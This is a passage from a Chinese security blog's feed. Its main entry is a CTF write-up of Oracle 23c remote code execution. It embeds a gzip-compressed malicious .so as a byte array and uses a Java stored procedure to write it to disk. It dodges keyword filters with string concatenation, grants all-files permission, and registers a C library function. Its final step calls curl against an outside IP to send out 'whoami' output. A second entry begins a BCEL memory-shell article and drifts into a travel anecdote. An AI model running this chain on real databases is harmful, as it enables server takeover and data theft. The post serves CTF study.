class="number">83</span>, <span class="number">12</span>, -<span class="number">20</span>, -<span class="number">84</span>, -<span class="number">127</span>, <span class="number">38</span>, <span class="number">103</span>, -<span class="number">82</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">38</span>, -<span class="number">16</span>, <span class="number">74</span>, <span class="number">82</span>, -<span class="number">72</span>, -<span class="number">115</span>, <span class="number">68</span>, <span class="number">4</span>, <span class="number">87</span>, <span class="number">59</span>, <span class="number">68</span>, -<span class="number">50</span>, -<span class="number">113</span>, -<span class="number">90</span>, <span class="number">77</span>, -<span class="number">83</span>, -<span class="number">113</span>, -<span class="number">78</span>, -<span class="number">103</span>, -<span class="number">77</span>, <span class="number">121</span>, <span class="number">16</span>, -<span class="number">81</span>, <span class="number">50</span>, <span class="number">89</span>, -<span class="number">45</span>, -<span class="number">112</span>, <span class="number">7</span>, <span class="number">50</span>, <span class="number">67</span>, <span class="number">114</span>, -<span class="number">33</span>, <span class="number">80</span>, <span class="number">50</span>, -<span class="number">91</span>, -<span class="number">41</span>, <span class="number">38</span>, <span class="number">117</span>, <span class="number">98</span>, <span class="number">89</span>, -<span class="number">125</span>, <span class="number">90</span>, <span class="number">126</span>, -<span class="number">112</span>, -<span class="number">56</span>, -<span class="number">6</span>, <span class="number">104</span>, -<span class="number">122</span>, <span class="number">42</span>, <span class="number">109</span>, <span class="number">54</span>, <span class="number">115</span>, <span class="number">118</span>, -<span class="number">55</span>, -<span class="number">80</span>, -<span class="number">111</span>, -<span class="number">53</span>, <span class="number">39</span>, -<span class="number">77</span>, <span class="number">25</span>, -<span class="number">105</span>, -<span class="number">95</span>, -<span class="number">46</span>, -<span class="number">78</span>, -<span class="number">100</span>, -<span class="number">111</span>, -<span class="number">46</span>, <span class="number">88</span>, <span class="number">69</span>, -<span class="number">72</span>, <span class="number">58</span>, -<span class="number">110</span>, <span class="number">50</span>, -<span class="number">119</span>, <span class="number">108</span>, <span class="number">77</span>, -<span class="number">102</span>, <span class="number">93</span>, -<span class="number">54</span>, <span class="number">3</span>, <span class="number">89</span>, <span class="number">122</span>, <span class="number">97</span>, <span class="number">26</span>, <span class="number">35</span>, -<span class="number">12</span>, <span class="number">108</span>, <span class="number">45</span>, -<span class="number">83</span>, -<span class="number">100</span>, -<span class="number">53</span>, -<span class="number">22</span>, -<span class="number">102</span>, -<span class="number">87</span>, <span class="number">17</span>, -<span class="number">39</span>, <span class="number">24</span>, -<span class="number">124</span>, <span class="number">27</span>, <span class="number">52</span>, -<span class="number">88</span>, -<span class="number">25</span>, <span class="number">22</span>, <span class="number">44</span>, <span class="number">91</span>, <span class="number">106</span>, -<span class="number">33</span>, <span class="number">41</span>, <span class="number">91</span>, -<span class="number">127</span>, -<span class="number">41</span>, -<span class="number">76</span>, <span class="number">7</span>, <span class="number">45</span>, -<span class="number">99</span>, <span class="number">76</span>, <span class="number">16</span>, -<span class="number">42</span>, -<span class="number">94</span>, -<span class="number">35</span>, -<span class="number">119</span>, -<span class="number">35</span>, <span class="number">78</span>, <span class="number">95</span>, <span class="number">62</span>, <span class="number">79</span>, <span class="number">100</span>, -<span class="number">6</span>, -<span class="number">84</span>, -<span class="number">92</span>, -<span class="number">23</span>, <span class="number">125</span>, -<span class="number">11</span>, <span class="number">122</span>, -<span class="number">8</span>, -<span class="number">2</span>, <span class="number">57</span>, -<span class="number">40</span>, <span class="number">62</span>, -<span class="number">24</span>, -<span class="number">52</span>, <span class="number">101</span>, -<span class="number">16</span>, -<span class="number">53</span>, -<span class="number">5</span>, <span class="number">65</span>, -<span class="number">16</span>, -<span class="number">71</span>, <span class="number">83</span>, <span class="number">44</span>, -<span class="number">51</span>, -<span class="number">24</span>, <span class="number">55</span>, -<span class="number">70</span>, <span class="number">87</span>, -<span class="number">96</span>, <span class="number">30</span>, -<span class="number">9</span>, -<span class="number">57</span>, <span class="number">67</span>, -<span class="number">100</span>, <span class="number">30</span>, -<span class="number">9</span>, <span class="number">17</span>, -<span class="number">2</span>, -<span class="number">1</span>, <span class="number">72</span>, -<span class="number">73</span>, <span class="number">19</span>, <span class="number">123</span>, <span class="number">111</span>, <span class="number">68</span>, <span class="number">61</span>, -<span class="number">18</span>, -<span class="number">97</span>, -<span class="number">56</span>, -<span class="number">72</span>, -<span class="number">97</span>, -<span class="number">79</span>, <span class="number">126</span>, <span class="number">37</span>, -<span class="number">121</span>, <span class="number">30</span>, -<span class="number">9</span>, -<span class="number">75</span>, <span class="number">38</span>, <span class="number">104</span>, <span class="number">27</span>, -<span class="number">11</span>, -<span class="number">72</span>, <span class="number">31</span>, <span class="number">35</span>, -<span class="number">29</span>, -<span class="number">2</span>, -<span class="number">117</span>, -<span class="number">112</span>, <span class="number">56</span>, <span class="number">91</span>, <span class="number">33</span>, -<span class="number">10</span>, <span class="number">94</span>, -<span class="number">120</span>, <span class="number">122</span>, -<span class="number">36</span>, -<span class="number">1</span>, -<span class="number">112</span>, <span class="number">43</span>, -<span class="number">71</span>, -<span class="number">15</span>, <span class="number">7</span>, <span class="number">56</span>, <span class="number">102</span>, <span class="number">121</span>, <span class="number">55</span>, -<span class="number">13</span>, <span class="number">14</span>, <span class="number">61</span>, -<span class="number">18</span>, -<span class="number">81</span>, -<span class="number">56</span>, <span class="number">81</span>, -<span class="number">97</span>, -<span class="number">15</span>, <span class="number">35</span>, <span class="number">116</span>, <span class="number">40</span>, <span class="number">67</span>, <span class="number">61</span>, -<span class="number">18</span>, -<span class="number">25</span>, -<span class="number">56</span>, <span class="number">56</span>, <span class="number">127</span>, <span class="number">126</span>, -<span class="number">3</span>, <span class="number">112</span>, -<span class="number">2</span>, <span class="number">25</span>, -<span class="number">48</span>, -<span class="number">73</span>, -<span class="number">128</span>, -<span class="number">115</span>, -<span class="number">17</span>, <span class="number">7</span>, -<span class="number">56</span>, -<span class="number">50</span>, -<span class="number">9</span>, -<span class="number">115</span>, -<span class="number">107</span>, <span class="number">30</span>, -<span class="number">6</span>, <span class="number">17</span>, -<span class="number">30</span>, -<span class="number">54</span>, <span class="number">117</span>, -<span class="number">70</span>, <span class="number">41</span>, -<span class="number">81</span>, <span class="number">13</span>, -<span class="number">33</span>, <span class="number">59</span>, <span class="number">16</span>, -<span class="number">4</span>, -<span class="number">3</span>, -<span class="number">49</span>, <span class="number">115</span>, -<span class="number">6</span>, <span class="number">104</span>, -<span class="number">124</span>, <span class="number">99</span>, -<span class="number">82</span>, <span class="number">62</span>, -<span class="number">97</span>, <span class="number">62</span>, -<span class="number">9</span>, <span class="number">44</span>, -<span class="number">89</span>, <span class="number">111</span>, -<span class="number">118</span>, -<span class="number">72</span>, -<span class="number">103</span>, <span class="number">95</span>, -<span class="number">81</span>, <span class="number">32</span>, -<span class="number">57</span>, <span class="number">47</span>, <span class="number">113</span>, <span class="number">122</span>, -<span class="number">36</span>, -<span class="number">73</span>, -<span class="number">111</span>, -<span class="number">65</span>, -<span class="number">15</span>, -<span class="number">23</span>, <span class="number">31</span>, <span class="number">113</span>, -<span class="number">102</span>, -<span class="number">45</span>, -<span class="number">29</span>, <span class="number">126</span>, -<span class="number">121</span>, <span class="number">28</span>, -<span class="number">30</span>, -<span class="number">22</span>, -<span class="number">13</span>, -<span class="number">13</span>, <span class="number">127</span>, <span class="number">25</span>, -<span class="number">12</span>, -<span class="number">59</span>, <span class="number">92</span>, -<span class="number">96</span>, -<span class="number">88</span>, -<span class="number">101</span>, -<span class="number">7</span>, -<span class="number">9</span>, <span class="number">39</span>, -<span class="number">2</span>, -<span class="number">7</span>, <span class="number">59</span>, -<span class="number">57</span>, -<span class="number">23</span>, -<span class="number">3</span>, -<span class="number">14</span>, -<span class="number">25</span>, -<span class="number">4</span>, -<span class="number">6</span>, <span class="number">127</span>, -<span class="number">101</span>, -<span class="number">45</span>, <span class="number">111</span>, -<span class="number">120</span>, -<span class="number">70</span>, -<span class="number">7</span>, <span class="number">24</span>, <span class="number">87</span>, -<span class="number">97</span>, <span class="number">95</span>, -<span class="number">49</span>, -<span class="number">9</span>, -<span class="number">120</span>, -<span class="number">3</span>, -<span class="number">116</span>, -<span class="number">29</span>, <span class="number">56</span>, -<span class="number">117</span>, -<span class="number">7</span>, <span class="number">116</span>, -<span class="number">75</span>, -<span class="number">34</span>, -<span class="number">11</span>, -<span class="number">7</span>, -<span class="number">11</span>, <span class="number">103</span>, -<span class="number">5</span>, <span class="number">126</span>, -<span class="number">40</span>, -<span class="number">95</span>, <span class="number">47</span>, -<span class="number">66</span>, -<span class="number">41</span>, -<span class="number">56</span>, -<span class="number">18</span>, <span class="number">122</span>, <span class="number">126</span>, -<span class="number">6</span>, -<span class="number">49</span>, -<span class="number">119</span>, <span class="number">59</span>, <span class="number">39</span>, -<span class="number">85</span>, -<span class="number">104</span>, -<span class="number">81</span>, <span class="number">8</span>, <span class="number">122</span>, -<span class="number">52</span>, <span class="number">83</span>, <span class="number">44</span>, -<span class="number">27</span>, <span class="number">116</span>, <span class="number">120</span>, <span class="number">31</span>, -<span class="number">113</span>, <span class="number">19</span>, <span class="number">123</span>, -<span class="number">2</span>, -<span class="number">88</span>, -<span class="number">57</span>, -<span class="number">4</span>, -<span class="number">81</span>, -<span class="number">53</span>, -<span class="number">101</span>, <span class="number">109</span>, -<span class="number">114</span>, -<span class="number">34</span>, -<span class="number">94</span>, -<span class="number">1</span>, -<span class="number">81</span>, <span class="number">56</span>, <span class="number">61</span>, -<span class="number">66</span>, <span class="number">119</span>, -<span class="number">52</span>, -<span class="number">34</span>, -<span class="number">90</span>, -<span class="number">2</span>, <span class="number">59</span>, <span class="number">78</span>, <span class="number">95</span>, -<span class="number">52</span>, <span class="number">75</span>, -<span class="number">85</span>, <span class="number">115</span>, -<span class="number">41</span>, -<span class="number">29</span>, -<span class="number">11</span>, -<span class="number">120</span>, -<span class="number">17</span>, -<span class="number">63</span>, -<span class="number">121</span>, <span class="number">122</span>, <span class="number">124</span>, <span class="number">31</span>, -<span class="number">118</span>, -<span class="number">8</span>, -<span class="number">24</span>, -<span class="number">7</span>, -<span class="number">25</span>, <span class="number">103</span>, <span class="number">22</span>, <span class="number">124</span>, -<span class="number">4</span>, -<span class="number">85</span>, <span class="number">46</span>, -<span class="number">22</span>, <span class="number">107</span>, <span class="number">124</span>, -<span class="number">12</span>, <span class="number">78</span>, -<span class="number">10</span>, -<span class="number">54</span>, <span class="number">99</span>, -<span class="number">85</span>, <span class="number">3</span>, -<span class="number">3</span>, <span class="number">17</span>, <span class="number">40</span>, <span class="number">100</span>, -<span class="number">33</span>, <span class="number">71</span>, <span class="number">43</span>, -<span class="number">56</span>, -<span class="number">51</span>, -<span class="number">1</span>, <span class="number">126</span>, -<span class="number">124</span>, -<span class="number">120</span>, -<span class="number">9</span>, <span class="number">55</span>, -<span class="number">62</span>, -<span class="number">7</span>, <span class="number">122</span>, -<span class="number">101</span>, -<span class="number">57</span>, -<span class="number">72</span>, <span class="number">1</span>, -<span class="number">13</span>, -<span class="number">29</span>, <span class="number">95</span>, -<span class="number">26</span>, -<span class="number">93</span>, -<span class="number">81</span>, -<span class="number">38</span>, <span class="number">106</span>, -<span class="number">13</span>, <span class="number">13</span>, -<span class="number">50</span>, -<span class="number">49</span>, -<span class="number">21</span>, -<span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">8</span>, -<span class="number">29</span>, <span class="number">16</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">        GZIPInputStream gzipInputStream = <span class="keyword">new</span> <span class="title class_">GZIPInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(data));</span><br><span class="line">        FileOutputStream fileOutputStream = <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(path);</span><br><span class="line"></span><br><span class="line">        byte[] buffer = <span class="keyword">new</span> byte[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> len;</span><br><span class="line">        <span class="keyword">while</span> ((len = gzipInputStream.<span class="title function_ invoke__">read</span>(buffer)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            fileOutputStream.<span class="title function_ invoke__">write</span>(buffer, <span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        gzipInputStream.<span class="title function_ invoke__">close</span>();</span><br><span class="line">        fileOutputStream.<span class="title function_ invoke__">close</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;write ok&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702560252598-2c445037-c2e9-411a-8b4f-fb890297033d.png#averageHue=%23000000&clientId=uc0602720-8ce8-4&from=paste&height=201&id=ucd7793fc&originHeight=201&originWidth=888&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6727&status=done&style=none&taskId=uaf2245c1-bed1-4f10-93d2-47b5cde9cae&title=&width=888" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702560369300-3ff24f27-4790-4adf-af61-26abca9cb8e0.png#averageHue=%23cecece&clientId=uc0602720-8ce8-4&from=paste&height=1415&id=u3999d00e&originHeight=1415&originWidth=2550&originalType=binary&ratio=1&rotation=0&showTitle=false&size=105404&status=done&style=none&taskId=uc54d8c30-c709-4dd8-bd90-185cbb6d9a3&title=&width=2550" alt="image.png"><br>这段代码会写入一个恶意的so文件。接下来该做的就是创建function了。<br><code>sql=create or replace function java_write(path varchar2) return varchar2 as language java name &#39;JavaTool.write(java.lang.String) return java.lang.String&#39;;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702560389246-ca027db9-e845-4540-a3f6-24ff3af342c2.png#averageHue=%23cfcfcf&clientId=uc0602720-8ce8-4&from=paste&height=1408&id=ueffd5485&originHeight=1408&originWidth=1982&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67434&status=done&style=none&taskId=ub238d9d6-63b6-4973-95bc-1d40f8543c6&title=&width=1982" alt="image.png"><br>接下来调用这个java_write写入恶意so</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">java_write</span>(<span class="string">&#x27;/tmp/evil.so&#x27;</span>) = <span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">then dbms_output.<span class="title function_ invoke__">put_line</span>(<span class="string">&#x27;Valid&#x27;</span>);</span><br><span class="line"><span class="keyword">else</span> dbms_output.<span class="title function_ invoke__">put_line</span>(<span class="string">&#x27;Invalid&#x27;</span>);</span><br><span class="line">end <span class="keyword">if</span>;</span><br><span class="line">end;</span><br></pre></td></tr></table></figure><p>在这里select被过滤了，因此我们需要使用别的语句去调用方法，这里用的是if语句。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702560534500-6e1249e5-ac7a-44fc-8276-dfe04092b94b.png#averageHue=%232a2d32&clientId=uc0602720-8ce8-4&from=paste&height=722&id=u42bf0c77&originHeight=722&originWidth=1498&originalType=binary&ratio=1&rotation=0&showTitle=false&size=130134&status=done&style=none&taskId=u7c20875e-aa50-46b2-8410-1ac3239a6bb&title=&width=1498" alt="image.png"><br>在这里报错了，原因是目录问题，我们只可以写入ORCLE_HOME,而其他文件位置我们是不知道的。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702560686655-f1536a98-017b-4023-add8-9b0991c5cc68.png#averageHue=%23070503&clientId=uc0602720-8ce8-4&from=paste&height=51&id=u5a707719&originHeight=51&originWidth=333&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3205&status=done&style=none&taskId=u10acba47-ccce-4b2d-8f5c-9e19fea8148&title=&width=333" alt="image.png"><br>改为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">java_write</span>(<span class="string">&#x27;/opt/oracle/product/23c/dbhomeFree/evil.so&#x27;</span>) = <span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">then dbms_output.<span class="title function_ invoke__">put_line</span>(<span class="string">&#x27;Valid&#x27;</span>);</span><br><span class="line"><span class="keyword">else</span> dbms_output.<span class="title function_ invoke__">put_line</span>(<span class="string">&#x27;Invalid&#x27;</span>);</span><br><span class="line">end <span class="keyword">if</span>;</span><br><span class="line">end;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702560748266-91b379ae-1b79-470a-8f25-421ca9db678c.png#averageHue=%232b2e32&clientId=uc0602720-8ce8-4&from=paste&height=798&id=u769dc0f6&originHeight=798&originWidth=1550&originalType=binary&ratio=1&rotation=0&showTitle=false&size=173069&status=done&style=none&taskId=u80ba3f1f-aa54-4ea0-99a2-d5b6e1f01ec&title=&width=1550" alt="image.png"><br>第二次报错是因为没有FilePermission，我们给他加上即可。这里绕过关键字用<code>||</code>拼贴就好</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">begin</span><br><span class="line">dbms_java.<span class="title function_ invoke__">grant_permission</span>(<span class="string">&#x27;SYSTEM&#x27;</span>, <span class="string">&#x27;SYS:java.io.FilePermission&#x27;</span>, <span class="string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>, <span class="string">&#x27;read,write,e&#x27;</span>||<span class="string">&#x27;xecute,del&#x27;</span>||<span class="string">&#x27;ete&#x27;</span>);</span><br><span class="line">end;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702560802447-85fc6fc8-1e96-4b41-8f7b-71e8e4267fbf.png#averageHue=%23d1d1d1&clientId=uc0602720-8ce8-4&from=paste&height=1365&id=u6e1c90b1&originHeight=1365&originWidth=2022&originalType=binary&ratio=1&rotation=0&showTitle=false&size=70825&status=done&style=none&taskId=u8fba8ff3-9987-48d0-ad88-79a775a7336&title=&width=2022" alt="image.png"><br>然后写入成功<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702560817933-2165493b-4274-442b-91c0-73a89cf2ae5e.png#averageHue=%23d2d2d2&clientId=uc0602720-8ce8-4&from=paste&height=1387&id=ufdfc13c0&originHeight=1387&originWidth=1712&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74797&status=done&style=none&taskId=u1eb9faf4-f0f6-4d92-9036-78d928148c3&title=&width=1712" alt="image.png"><br>看xz的wp他说这里进行了gzip压缩，假如不压缩会产生java source过长无法执行的问题，其实执行是肯定可以的，只是服务端设置的timeout是5s，因此导致执行失败。（gzip压缩后还可以被识别？）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702560842539-609689ca-30e7-46c0-8bc8-1cfd1943f095.png#averageHue=%23040301&clientId=uc0602720-8ce8-4&from=paste&height=179&id=u29f71115&originHeight=179&originWidth=979&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15459&status=done&style=none&taskId=uc614a58d-ed03-4fc7-b808-0dac2b1351a&title=&width=979" alt="image.png"></p><p>接下来创建lib即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create <span class="keyword">or</span> replace library lib_evils <span class="keyword">as</span> <span class="string">&#x27;/opt/oracle/product/23c/dbhomeFree/evil.so&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702560977924-955c7704-773e-4d88-89e0-f4e3639427ca.png#averageHue=%23cbcbcb&clientId=uc0602720-8ce8-4&from=paste&height=1401&id=ud9a68be4&originHeight=1401&originWidth=1856&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58368&status=done&style=none&taskId=u0f5cee77-bf88-449c-9ff5-54a65a6fe18&title=&width=1856" alt="image.png"><br>然后创建rce的function</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create <span class="keyword">or</span> replace <span class="function"><span class="keyword">function</span> <span class="title">rce</span>(<span class="params">str varchar2</span>) <span class="title">return</span> <span class="title">varchar2</span> <span class="title">as</span> <span class="title">language</span> <span class="title">c</span> <span class="title">library</span> <span class="title">lib_evils</span> <span class="title">name</span> &quot;<span class="title">cmd</span>&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702560996004-bca83c03-bf35-4672-a5be-9bdfc46e23e8.png#averageHue=%23dbdbdb&clientId=uc0602720-8ce8-4&from=paste&height=1294&id=u71796471&originHeight=1294&originWidth=1723&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50832&status=done&style=none&taskId=u56726d7f-aaf5-4fad-979a-0abfc1e7069&title=&width=1723" alt="image.png"><br>创建完毕后我们只需要和上面一样，用IF语句去调用rce方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">rce</span>(<span class="string">&#x27;/bin/cu&#x27;</span>||<span class="string">&#x27;rl ht&#x27;</span>||<span class="string">&#x27;tp://8.130.24.188:7775?a=`/bin/whoami`&#x27;</span>) = <span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">then dbms_output.<span class="title function_ invoke__">put_line</span>(<span class="string">&#x27;Valid&#x27;</span>);</span><br><span class="line"><span class="keyword">else</span> dbms_output.<span class="title function_ invoke__">put_line</span>(<span class="string">&#x27;Invalid&#x27;</span>);</span><br><span class="line">end <span class="keyword">if</span>;</span><br><span class="line">end;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702561336774-8d6dd01d-d37f-487e-93e5-b1e97e8e8b4f.png#averageHue=%232a2d32&clientId=uc0602720-8ce8-4&from=paste&height=752&id=u7959c7c8&originHeight=752&originWidth=1681&originalType=binary&ratio=1&rotation=0&showTitle=false&size=159302&status=done&style=none&taskId=u4b6b097f-8856-4bff-bbf7-9846617e005&title=&width=1681" alt="image.png"><br>这里其实还会遇到这个问题，也就是dll path，上述提到的问题，我不知道题目靶场的<code>$ORACLE_HOME/hs/admin/extproc.ora</code>里面设置的是什么，又或者是我的oracle版本过高（23c）导致的，低版本的oracle不需要设置这个？无论如何我现在需要修改一下文件内容<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702561497684-c70bc8f5-4890-4e83-9280-ee6206592a08.png#averageHue=%23030201&clientId=uc0602720-8ce8-4&from=paste&height=163&id=ud2653063&originHeight=163&originWidth=653&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11676&status=done&style=none&taskId=uec241284-78d2-41d8-a528-1be63278dec&title=&width=653" alt="image.png"><br>也可以把那个直接改为<code>SET EXTPROC_DLLS=ANY</code>直接开放，我估计题目靶场可能就是这么写的。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702573155758-4170eef9-5b28-4692-8b32-49212bc3c2a3.png#averageHue=%232e2e2d&clientId=ua1cfb816-af10-4&from=paste&height=753&id=uc4f7b21e&originHeight=753&originWidth=1512&originalType=binary&ratio=1&rotation=0&showTitle=false&size=80522&status=done&style=none&taskId=u48f69e06-1745-4430-9aa8-a7ea7cb8efe&title=&width=1512" alt="image.png"><br>在这一步并没出现xz师傅说到的不能执行&#x2F;bin目录下的指令，可能题目做了多余限制吧，假如有限制的话，那我们就只能用oracle根目录下的指令了，比如自带的perl，perl可以外带flag。</p><h2 id="误区"><a href="#误区" class="headerlink" title="误区"></a>误区</h2><p>我一直搞错那个lib的创建问题，问题出现在</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create <span class="keyword">or</span> replace <span class="function"><span class="keyword">function</span> <span class="title">rce</span>(<span class="params">str varchar2</span>) <span class="title">return</span> <span class="title">varchar2</span> <span class="title">as</span> <span class="title">language</span> <span class="title">c</span> <span class="title">library</span> <span class="title">lib_evils</span> <span class="title">name</span> &quot;<span class="title">cmd</span>&quot;</span>;</span><br></pre></td></tr></table></figure><p>这里的<code>name &quot;cmd&quot;</code>一定要和你so文件内的函数名字一样，这不是给这个function取名字，这部分通常用于在调用外部库的过程中指定要执行的函数或子例程的名称。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702573258880-648f7350-a0fb-41d1-aec9-da48e605b242.png#averageHue=%23fdfcfa&clientId=ua1cfb816-af10-4&from=paste&height=272&id=u928cacc5&originHeight=272&originWidth=818&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41519&status=done&style=none&taskId=u75e3c23f-dbd5-4b3e-a20e-89293009dff&title=&width=818" alt="image.png"></p>]]></content>
    
    
    <summary type="html">学习</summary>
    
    
    
    <category term="At Dawn" scheme="http://boogipop.com/categories/At-Dawn/"/>
    
    
    <category term="CTF" scheme="http://boogipop.com/tags/CTF/"/>
    
    <category term="Oracle" scheme="http://boogipop.com/tags/Oracle/"/>
    
  </entry>
  
  <entry>
    <title>BCEL环境下利用全反射构造高可用内存马</title>
    <link href="http://boogipop.com/2024/02/29/BCEL%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%88%A9%E7%94%A8%E5%85%A8%E5%8F%8D%E5%B0%84%E6%9E%84%E9%80%A0%E9%AB%98%E5%8F%AF%E7%94%A8%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>http://boogipop.com/2024/02/29/BCEL%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%88%A9%E7%94%A8%E5%85%A8%E5%8F%8D%E5%B0%84%E6%9E%84%E9%80%A0%E9%AB%98%E5%8F%AF%E7%94%A8%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2024-02-29T00:42:06.000Z</published>
    <updated>2024-02-29T00:42:06.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、回顾BCEL字节码"><a href="#一、回顾BCEL字节码" class="headerlink" title="一、回顾BCEL字节码"></a>一、回顾BCEL字节码</h1><p>文章在先知社区首发</p><p><a href="https://www.yuque.com/boogipop/iwyn7t/tznwzgs310vslquv?view=doc_embed">BCEL-ClassLoader赛博学习</a><br>懒狗写过一篇文章。所以就不多说BCEL字节码是个啥了。BCEL加载类有一个特点，只可以加载jdk原生的类，比如spring下面的所有类，都会报错ClassnotFound的错误。因此全反射诞生~<br>但是很遗憾的告诉大家，BCEL的ClassLoader在8u252后告别了大家~<br>但谁会用那么高版本的jdk呢^ ^</p><h1 id="、惊险小插曲"><a href="#、惊险小插曲" class="headerlink" title="[*]、惊险小插曲"></a>[*]、惊险小插曲</h1><p>现在是8.10 凌晨三点，我十二点下的飞机，最晚本来一点多就该到酒店了，可是经历了一次惊险的逃亡。由于是定的机票捆绑了机场酒店，我也没多想，就直接去了，结果到那是十二点半。酒店前台灯全是关的，也就是漆黑一片，当我怀疑被骗了的时候我打了一下高德地图里面酒店的电话。结果捏，酒店门口不是停了一些车子。车子上面有人看到我打了电话，下来了一个人。问我是不是入住的。我很爽快的说，yes sir。结果第一件事情是递我一根烟，让我出示身份证，到目前一切正常，拿到我身份证也不打开电脑核对，瞎几把看了一圈我的身份证后他妈和我说酒店住满了，要带我换酒店，到这里我的警觉神经就拉满了，我试探性问了一句去那个酒店。他随口来一句：如意酒店。我摸摸搜了一下，就在对面200米，但他让我上他的车，他送我。然后我说不用了，多麻烦，我自己走过去，他坚持要送我，然后夺命三连问：”你是本地人?”,”你几个人来的?”,”你家在哪?”。好家伙还查我户口，那我必然说是本地人，家在附近只是过个夜。<br>这里多亏我到目的后第一件事不是入住酒店，而是点一波烧烤。。。。而且好在烧烤师傅烤的贼几把烂，烤好久没烤好，我就说，你先等我一下，我先吃完烧烤。他说行，然后回到车子上。还给烧烤师傅和我都低了一根烟（现在我复盘，什么酒店老板会给烟的？他妈的他压根可能就不是老板）。在这时候，我就直接高德地图叫了个车，运气好，四分钟就到，而且我一直不让那byd发现我点了车，一直在烧烤店旁边周旋，假装在等烧烤（现在我他吗发现烧烤店老板肯定也是知道那个男的不是酒店老板，都在那里100米之内的店铺，老板是谁怎么可能不知道啊？不告诉我就说明有鬼啊）。然后车到了，我直接结账烧烤，就算烧烤没考好我也开润了。您猜怎么着，我猜对了，看到我马不停蹄的上车，烧烤店的老板也不问我要不要烧烤，那个车里的人看到我也不问我咋回事，就放我跑了。<br>最骚的是什么，等我到了市中心的一个全季酒店后，我继续拨打了刚刚没打通的前台电话，一阵ob下来，他说他们在房间休息，前台没人。我说那刚刚的老板是谁，他们说不认得。果然机场酒店不能随便住，最好也别晚上的航班了，还是一个人。给我整的人都是懵逼的。byd还好我跑得快，不然我不知道那b东西想干嘛。都2023年了，不会吧不会吧。<br><img src="https://cdn.nlark.com/yuque/0/2023/jpeg/32634994/1691608523065-dc8f7053-dc3e-43b2-b728-d2f2f2e523e4.jpeg#averageHue=%23cbc5ae&clientId=u8f5d9969-e0bd-4&from=paste&height=422&id=gi3dh&originHeight=528&originWidth=500&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=58270&status=done&style=none&taskId=u883dab11-0a1c-4fa7-87da-6658448ecf0&title=&width=400" 